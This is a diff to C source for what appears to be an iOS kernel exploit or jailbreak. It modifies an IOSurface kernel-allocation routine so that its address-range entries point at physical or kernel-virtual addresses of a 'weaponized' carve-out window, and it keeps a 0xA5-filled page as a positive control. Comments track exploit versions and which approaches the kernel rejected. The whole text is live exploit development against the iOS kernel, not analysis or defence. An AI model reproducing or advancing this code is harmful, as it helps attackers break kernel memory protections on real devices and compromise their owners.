@@ -181,7 +181,7 @@ static mach_port_t IOSurface_kalloc_getSurfacePort_16up(uint64_t size); // v94 f
 static uint64_t g_v105_pa = 0;     // carve-out window base PA
 static unsigned g_v105_seq = 0;    // window sequence (format ladder)
 
-static mach_port_t IOSurface_kalloc_getSurfacePort_16up_mode(uint64_t size, int mode,
+static mach_port_t IOSurface_kalloc_getSurfacePort_16up_mode(uint64_t size, int a5control,
                                                              uint64_t weaponPA,
                                                              unsigned weaponSeq); // v105 fwd
 
@@ -537,9 +537,8 @@ static mach_port_t IOSurface_kalloc_getSurfacePort_16up(uint64_t size) {
 	// weaponized. A5 positive control stays (mode 2 semantics) via the
 	// every-3rd-window override below.
 	static int a5Toggle = 0;
-	int mode = 0;
-	if ((++a5Toggle % 3) == 0) mode = 2;   // A5 control every 3rd window
-	return IOSurface_kalloc_getSurfacePort_16up_mode(size, 0, mode,
+	int a5 = ((++a5Toggle % 3) == 0) ? 1 : 0;   // A5 control every 3rd window
+	return IOSurface_kalloc_getSurfacePort_16up_mode(0x10000, a5,
 	                                                 g_v105_pa, g_v105_seq);
 }
 
@@ -551,7 +550,7 @@ static mach_port_t IOSurface_kalloc_getSurfacePort_16up(uint64_t size) {
 //   mode 2: A5 CONTROL (legacy keys) + a second A5-filled user page as
 //           entry target — if the wire reads the list AT ALL (any time),
 //           C,first = 0xA5A5A5A5A5A5A5A5. Unambiguous positive control.
-static mach_port_t IOSurface_kalloc_getSurfacePort_16up_mode(uint64_t size, int mode,
+static mach_port_t IOSurface_kalloc_getSurfacePort_16up_mode(uint64_t size, int a5control,
                                                              uint64_t weaponPA,
                                                              unsigned weaponSeq) {
 	uint64_t rangesAlignedSize = ((size + 0xf) & ~0xf);
@@ -562,17 +561,17 @@ static mach_port_t IOSurface_kalloc_getSurfacePort_16up_mode(uint64_t size, int 
 		vm_allocate(mach_task_self(), &dummyPage, dummyPageSize, VM_FLAGS_ANYWHERE);
 	}
 	static vm_address_t a5Page = 0;
-	if (mode == 2 && a5Page == 0) {
+	if (a5control && a5Page == 0) {
 		vm_allocate(mach_task_self(), &a5Page, dummyPageSize, VM_FLAGS_ANYWHERE);
 		if (a5Page) memset((void *)a5Page, 0xA5, dummyPageSize);
 	}
 
 	uint64_t *userspaceRanges = malloc(rangesAlignedSize);
-	// v105 ENTRY LADDER (overrides the A5 control when weaponSeq%2 set):
+	// v105 ENTRY LADDER (A5 control overrides when a5control set):
 	//   even weaponSeq: entries = carve-out PA values (PA-formed)
 	//   odd  weaponSeq: entries = kernel-VA of the carve-out pages
 	// 4 entries × 0x4000 = the full 0x10000 probe scan.
-	int entryMode = (mode == 2) ? -1 : (int)(weaponSeq & 1);
+	int entryMode = a5control ? -1 : (int)(weaponSeq & 1);
 	uint64_t entryBase = (entryMode == 1)
 	    ? phystokv(kvtophys(weaponPA & ~0x3FFFULL)) : (weaponPA & ~0x3FFFULL);
 	for (int i = 0; i < (rangesAlignedSize / sizeof(uint64_t)); i += 2) {
@@ -580,7 +579,7 @@ static mach_port_t IOSurface_kalloc_getSurfacePort_16up_mode(uint64_t size, int 
 			userspaceRanges[i]   = entryBase + (uint64_t)(i / 2) * 0x4000ULL;
 			userspaceRanges[i+1] = 0x4000ULL;
 		} else {
-			uint64_t t = (mode == 2 && a5Page) ? a5Page : dummyPage;
+			uint64_t t = (a5control && a5Page) ? a5Page : dummyPage;
 			userspaceRanges[i]   = t;
 			userspaceRanges[i+1] = dummyPageSize;
 		}
@@ -590,12 +589,12 @@ static mach_port_t IOSurface_kalloc_getSurfacePort_16up_mode(uint64_t size, int 
     free(userspaceRanges);
 
     CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, NULL, NULL);
-	if (mode != 1) {
-		// legacy + A5-control: AllocSize present (kernel-owned backing).
-		CFNumberRef sizeNum = CFNUM64(dummyPageSize);
-		CFDictionarySetValue(dict, CFSTR("IOSurfaceAllocSize"), (const void *)sizeNum);
-		CFRelease(sizeNum);
-	} // mode 1: NO AllocSize key — ranges-only surface.
+	// v105: AllocSize always present (mode-1 ranges-only was REJECTED by
+	// create in v97 — AllocSize is mandatory; the weaponization lives in
+	// the RANGES ENTRIES now).
+	CFNumberRef sizeNum = CFNUM64(dummyPageSize);
+	CFDictionarySetValue(dict, CFSTR("IOSurfaceAllocSize"), (const void *)sizeNum);
+	CFRelease(sizeNum);
 	CFDictionarySetValue(dict, CFSTR("IOSurfaceAddressRanges"), (const void *)userspaceRangesData);
 
     IOSurfaceRef surfaceRef = IOSurfaceCreate(dict);
@@ -604,7 +603,7 @@ static mach_port_t IOSurface_kalloc_getSurfacePort_16up_mode(uint64_t size, int 
 
 	CFRelease(userspaceRangesData);
 	CFRelease(dict);
-	jb_tr_beacon("KMAP ctor,mode=%d,port=%x", mode, port);
+	jb_tr_beacon("KMAP ctor,a5=%d,port=%x", a5control, port);
 
     return port;
 }
